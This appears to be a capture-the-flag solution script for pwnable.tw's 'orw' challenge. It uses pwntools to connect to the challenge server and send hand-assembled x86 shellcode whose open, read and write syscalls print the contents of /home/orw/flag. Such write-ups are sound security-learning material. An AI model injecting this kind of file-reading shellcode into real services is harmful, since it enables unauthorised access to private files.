from pwn import *
p = remote('chall.pwnable.tw', 10001)
# p = process('./orw')
# gdb.attach(p)

# Read the flag from /home/orw/flag

shell_code = ''

# open
shell_code += "\x31\xC9\xB8\x05\x00\x00\x00\x51\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\x89\xE3\x31\xD2\xCD\x80"
# read
shell_code += "\xB8\x03\x00\x00\x00\x89\xD9\xBB\x03\x00\x00\x00\xB2\x30\xCD\x80"
# write
shell_code += "\xB8\x04\x00\x00\x00\xB3\x01\xCD\x80"

p.recvuntil("shellcode:")
p.sendline(shell_code)
print(p.recvall())
